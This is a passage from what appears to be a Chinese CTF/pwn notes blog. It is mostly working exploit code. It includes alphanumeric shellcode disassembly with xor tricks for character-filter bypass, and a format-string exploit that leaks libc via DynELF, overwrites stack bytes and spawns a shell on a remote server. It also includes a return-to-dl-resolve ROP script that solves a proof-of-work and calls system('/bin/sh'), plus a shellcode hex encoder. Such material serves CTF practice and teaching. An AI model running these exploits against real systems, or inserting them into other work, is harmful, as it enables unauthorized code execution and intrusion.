pop    eax</span><br><span class="line"> 21:   30 41 34                xor    BYTE PTR [ecx+0x34],al</span><br><span class="line"> 24:   75 38                   jne    0x5e</span><br><span class="line"> 26:   6a 33                   push   0x33</span><br><span class="line"> 28:   58                      pop    eax</span><br><span class="line"> 29:   50                      push   eax</span><br><span class="line"> 2a:   50                      push   eax</span><br><span class="line"> 2b:   50                      push   eax</span><br><span class="line"> 2c:   75 38                   jne    0x66</span><br><span class="line"> 2e:   72 59                   jb     0x89</span><br><span class="line"> 30:   30 52 59                xor    BYTE PTR [edx+0x59],dl</span><br><span class="line"> 33:   75 39                   jne    0x6e</span><br><span class="line"> 35:   50                      push   eax</span><br><span class="line"> 36:   34 38                   xor    al,0x38</span><br><span class="line"> 38:   32                      .byte 0x32</span><br><span class="line"> 39:   4c                      dec    esp</span><br></pre></td></tr></table></figure>
<pre><code>通过xor al的值 达成动态更改shellcode的值绕过特定字符限制
dec eax
xor al
 xor    BYTE PTR [ecx+0x34],al
</code></pre><h1 id="python-pwn应用"><a href="#python-pwn应用" class="headerlink" title="python pwn应用"></a>python pwn应用</h1><p>p.clean()清空</p>
<p>p=process(pc,env={“LD_PRELOAD”:’./libc.so.6’})加载指定库</p>
<p>cyclic崩溃测试</p>
<p>cyclic_find数据截止到</p>
<p>envp  environ libc中查看栈</p>
<p>context.log_level = ‘debug’</p>
<p>ROPgadget –binary kidding –ropchain 生成rop链</p>
<h1 id="DYNELF"><a href="#DYNELF" class="headerlink" title="DYNELF"></a>DYNELF</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># based on joker 's exploit</span></span><br><span class="line">r = remote(<span class="string">"106.75.84.74"</span>, <span class="number">10001</span>)<span class="comment">#pwn</span></span><br><span class="line"><span class="comment">#r = remote("127.0.0.1", 10001)#pwn</span></span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line">read_got = <span class="number">0x0000000000601FC8</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400ed3</span></span><br><span class="line">pppr = <span class="number">0x000000000400ECE</span></span><br><span class="line"><span class="comment">#ret addr 0x0000000000400e56</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"20):"</span>)</span><br><span class="line">    payload = <span class="string">"aaaa"</span></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recvuntil(<span class="string">"20):"</span>)</span><br><span class="line">    payload = <span class="string">"%12$s"</span>+<span class="string">"AAAAAAA"</span> + p64(addr)</span><br><span class="line">    r.send(payload)</span><br><span class="line">    r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    content = r.recvuntil(<span class="string">"AAAAAAA"</span>)</span><br><span class="line">    <span class="keyword">if</span>(len(content) == <span class="number">12</span>):</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[*] NULL "</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'\x00'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[*]%#x -- &gt; %s"</span> % (addr,(content[<span class="number">5</span>:<span class="number">-7</span>] <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">        <span class="keyword">return</span> content[<span class="number">5</span>:<span class="number">-7</span>]</span><br><span class="line"><span class="comment">#writebyte</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writebyte</span><span class="params">(count_byte,addr)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"20):"</span>)</span><br><span class="line">    payload = <span class="string">"aaaa"</span></span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    r.recvuntil(<span class="string">"20):"</span>)</span><br><span class="line">    payload = <span class="string">"%&#123;0&#125;c%12$hhn"</span>.format(count_byte)</span><br><span class="line">    payload += <span class="string">"A"</span>*(<span class="number">12</span>-len(payload)) + p64(addr)</span><br><span class="line">    r.send(payload)</span><br><span class="line">    r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"40):"</span>)</span><br><span class="line">r.sendline(<span class="string">"aaa"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"40):"</span>)</span><br><span class="line">r.sendline(<span class="string">"aaa"</span>)</span><br><span class="line">d = DynELF(leak,elf=ELF(<span class="string">'./pwnme'</span>))</span><br><span class="line">system_addr = d.lookup(<span class="string">'system'</span>,<span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] system addr:&#123;0&#125;"</span>.format(hex(system_addr))</span><br><span class="line"><span class="comment">#leak ret_addr</span></span><br><span class="line">r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"2"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"20):"</span>)</span><br><span class="line">payload = <span class="string">"aaaa"</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">"20):"</span>)</span><br><span class="line">payload = <span class="string">"%6$s"</span> <span class="comment">#stack</span></span><br><span class="line">r.send(payload)</span><br><span class="line">r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"1"</span>)</span><br><span class="line">r.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">content = r.recv(<span class="number">6</span>)</span><br><span class="line">content = content.ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)</span><br><span class="line">stack_addr = u64(content)  <span class="comment"># 0x7ffc23fb85e0</span></span><br><span class="line">stack_while_ret_addr = stack_addr + <span class="number">8</span> - <span class="number">0xb0</span> <span class="comment">#</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*] stack_while_ret addr:&#123;0&#125;"</span>.format(hex(stack_while_ret_addr))</span><br><span class="line"><span class="comment">#leak_ret_addr</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0000| 0x7ffc23fb84f0 --&gt; 0x7ffc23fb8530 --&gt; 0x7ffc23fb85e0 --&gt; 0x400e70 (push   r15)</span></span><br><span class="line"><span class="string">0008| 0x7ffc23fb84f8 --&gt; 0x400d32 (add    rsp,0x30)</span></span><br><span class="line"><span class="string">0016| 0x7ffc23fb8500 --&gt; 0xa61616161 ('aaaa\n')</span></span><br><span class="line"><span class="string">0024| 0x7ffc23fb8508 --&gt; 0x0 </span></span><br><span class="line"><span class="string">0032| 0x7ffc23fb8510 --&gt; 0x7324362500000000 ('')</span></span><br><span class="line"><span class="string">0040| 0x7ffc23fb8518 --&gt; 0x0 </span></span><br><span class="line"><span class="string">0048| 0x7ffc23fb8520 --&gt; 0x0 </span></span><br><span class="line"><span class="string">0056| 0x7ffc23fb8528 --&gt; 0x400d0b (cmp    eax,0x2)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">writebyte(<span class="number">0xce</span>,stack_while_ret_addr)</span><br><span class="line">writebyte(system_addr &amp; <span class="number">0xff</span>,stack_while_ret_addr + <span class="number">0x30</span>)</span><br><span class="line">writebyte((system_addr &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>,stack_while_ret_addr + <span class="number">0x30</span> + <span class="number">1</span>)</span><br><span class="line">writebyte((system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>,stack_while_ret_addr + <span class="number">0x30</span> + <span class="number">2</span>)</span><br><span class="line">writebyte((system_addr &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>,stack_while_ret_addr + <span class="number">0x30</span> + <span class="number">3</span>)</span><br><span class="line">writebyte((system_addr &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xff</span>,stack_while_ret_addr + <span class="number">0x30</span> + <span class="number">4</span>)</span><br><span class="line">writebyte((system_addr &gt;&gt; <span class="number">40</span>) &amp; <span class="number">0xff</span>,stack_while_ret_addr + <span class="number">0x30</span> + <span class="number">5</span>)</span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">"2"</span>)</span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"20):"</span>)</span><br><span class="line">payload = <span class="string">"/bin/sh;"</span> + <span class="string">"AAAAAAAABBB"</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"20):"</span>)</span><br><span class="line">payload = <span class="string">"\x00\x00\x00\x00"</span> + p64(pop_rdi_ret) + p64(stack_while_ret_addr + <span class="number">8</span>)</span><br><span class="line"><span class="comment">#raw_input('$ret')</span></span><br><span class="line">r.send(payload)</span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"&gt;"</span>)</span><br><span class="line">r.sendline(<span class="string">'3'</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># shellcode</span><br><span class="line"></span><br><span class="line">	from pwn import *</span><br><span class="line">	c=asm(</span><br><span class="line">	&quot;&quot;&quot;</span><br><span class="line">	jmp lab1;</span><br><span class="line">	nop</span><br><span class="line">	nop</span><br><span class="line">	nop</span><br><span class="line">	nop</span><br><span class="line">	nop</span><br><span class="line">	nop</span><br><span class="line">	nop</span><br><span class="line">	nop</span><br><span class="line">	lab1:</span><br><span class="line">	nop</span><br><span class="line">	&quot;&quot;&quot;,arch=&apos;amd64&apos;)</span><br><span class="line">	print c.encode(&apos;hex&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	z=c.encode(&apos;hex&apos;)</span><br><span class="line">	a=0</span><br><span class="line">	q=&quot;&quot;</span><br><span class="line">	while(a&lt;len(z)):</span><br><span class="line">	q+=&quot;\\x&quot;+z[a]+z[a+1]</span><br><span class="line">	a=a+2</span><br><span class="line">	print q</span><br></pre></td></tr></table></figure>
<p>rtd<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding:utf-8</span><br><span class="line">import sys</span><br><span class="line">sys.path.append(&apos;./roputils&apos;)</span><br><span class="line">import roputils</span><br><span class="line">from pwn import *</span><br><span class="line">from hashlib import sha256</span><br><span class="line"></span><br><span class="line">fpath = &apos;./babystack&apos;</span><br><span class="line">offset = 44</span><br><span class="line"></span><br><span class="line">readplt = 0x08048300</span><br><span class="line">bss = 0x0804a020</span><br><span class="line">vulFunc = 0x0804843B</span><br><span class="line"></span><br><span class="line">#p = process(fpath)</span><br><span class="line">#p = remote(&apos;202.120.7.202&apos;, 6666)</span><br><span class="line">p = remote(&apos;127.0.0.1&apos;, 6666)</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def getsol(chal):</span><br><span class="line">	for a in range(33,125):</span><br><span class="line">		for b in range (33, 125):</span><br><span class="line">			for c in range (33, 125):</span><br><span class="line">				for d in range(33,125):</span><br><span class="line">					sol = str(chr(a)) + str(chr(b)) + str(chr(c)) + str(chr(d))</span><br><span class="line">					if sha256(chal + sol).digest().startswith(&apos;\0\0\0&apos;):</span><br><span class="line">						print(&apos;sha256 success! sol = &apos; + sol)</span><br><span class="line">						return sol</span><br><span class="line"></span><br><span class="line">rop = roputils.ROP(fpath)</span><br><span class="line">addr_bss = rop.section(&apos;.bss&apos;)</span><br><span class="line"></span><br><span class="line">chal = p.recvline()</span><br><span class="line">chal = chal.strip(&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">print &apos;chal = %r&apos; %(chal)</span><br><span class="line">sol = getsol(chal)</span><br><span class="line">p.send(sol)</span><br><span class="line"></span><br><span class="line"># step1 : write shStr &amp; resolve struct to bss</span><br><span class="line"># read指向bss,让下文写入binShStr和构造的fake dl_resolve结构，获得system解析链</span><br><span class="line"># buf1 = rop.retfill(offset)</span><br><span class="line">buf1 = &apos;A&apos; * offset #44</span><br><span class="line">buf1 += p32(readplt) + p32(vulFunc) + p32(0) + p32(addr_bss) + p32(100)</span><br><span class="line">p.send(buf1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf2 = &apos;/bin/sh\0&apos;</span><br><span class="line">buf2 += rop.fill(20, buf2)</span><br><span class="line">buf2 += rop.dl_resolve_data(addr_bss+20, &apos;system&apos;)</span><br><span class="line">buf2 += rop.fill(100, buf2)</span><br><span class="line">p.send(buf2)</span><br><span class="line"></span><br><span class="line"># dl_resolve解析链构造完成后的调用也可用它自带的，亦或者自己计算reloc_offset自己调用plt0传入也行。</span><br><span class="line"></span><br><span class="line"># step3 : use dl_resolve_call get system &amp; system(&apos;/bin/sh&apos;)</span><br><span class="line"># 利用roputils自带的调用生成rop</span><br><span class="line">buf3 = &apos;A&apos; * offset + rop.dl_resolve_call(addr_bss+20, addr_bss)# + &apos;a&apos;*30</span><br><span class="line">p.sendline(buf3)</span><br></pre></td></tr></table></figure></p>

      
    </div>
    
    <footer>
        <div class="alignright">
          

        </div>
        
        
        <!-- partial('post/share') -->
      <div class="clearfix"></div>
    </footer>
  </div>
</article>






<nav id="pagination">
  
</nav>
</div></div>
    <aside id="sidebar" class="alignright">
  

  
<div class="widget tag">
  <h3 class="title">archives</h3>
  <ul class="entry">
    
      <li>
        <a href="/2018/10/23/unleak/">unleak利用</a>
      </li>
    
      <li>
        <a href="/2018/10/21/漏洞挖掘/">漏洞挖掘</a>
      </li>
    
      <li>
        <a href="/2018/10/21/文件读写内存实例/">文件读写内存实例</a>
      </li>
    
      <li>
        <a href="/2018/10/21/堆溢出/">堆溢出</a>
      </li>
    
      <li>
        <a href="/2018/10/21/分布式/">分布式搭建</a>
      </li>
    
      <li>
        <a href="/2018/10/21/内核编译/">内核编译</a>
      </li>
    
      <li>
        <a href="/2018/10/21/关闭nx与反弹shell/">关闭nx与反弹shell</a>
      </li>
    
      <li>
        <a href="/2018/10/21/两道内核/">驱动漏洞</a>
      </li>
    
      <li>
        <a href="/2018/10/21/windows机制/">windows机制</a>
      </li>
    
      <li>
        <a href="/2018/10/21/windbg学习总结/">windbg学习总结</a>
      </li>
    
      <li>
        <a href="/2018/10/21/web/">随意码的web</a>
      </li>
    
      <li>
        <a href="/2018/10/21/rtd/">return to dl-resolve</a>
      </li>
    
      <li>
        <a href="/2018/10/21/pwnable.tw/">pwnable.tw总结</a>
      </li>
    
      <li>
        <a href="/2018/10/21/patch/">patch</a>
      </li>
    
      <li>
        <a href="/2018/10/21/offbyone/">off-by-one</a>
      </li>
    
      <li>
        <a href="/2018/10/21/hor/">House-Of-Rabbit</a>
      </li>
    
      <li>
        <a href="/2018/10/21/hfo/">house-of-orange</a>
      </li>
    
      <li>
        <a href="/2018/10/21/hexo/">搭建博客</a>
      </li>
    
      <li>
        <a href="/2018/10/21/glibc malloc和free/">glibc malloc和free</a>
      </li>
    
      <li>
        <a href="/2018/10/21/doublefree/">double free</a>
      </li>
    
      <li>
        <a href="/2018/10/21/brop/">brop</a>
      </li>
    
      <li>
        <a href="/2018/10/21/bpf/">bpf</a>
      </li>
    
      <li>
        <a href="/2018/10/21/afl/">afl</a>
      </li>
    
      <li>
        <a href="/2018/07/07/各种脚本/">各种脚本（比赛时候懒得现写）</a>
      </li>
    
  </ul>
</div>


  

  
</aside>
    <div class="clearfix"></div>
  </div>
  <footer id="footer" class="inner"><div class="alignleft">
  <p>
  
  &copy; 2018 another
  
  All rights reserved.</p>
  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
</div>
<div class="clearfix"></div>

<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
  <script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>


<div id='bg'></div>
</body>
</html>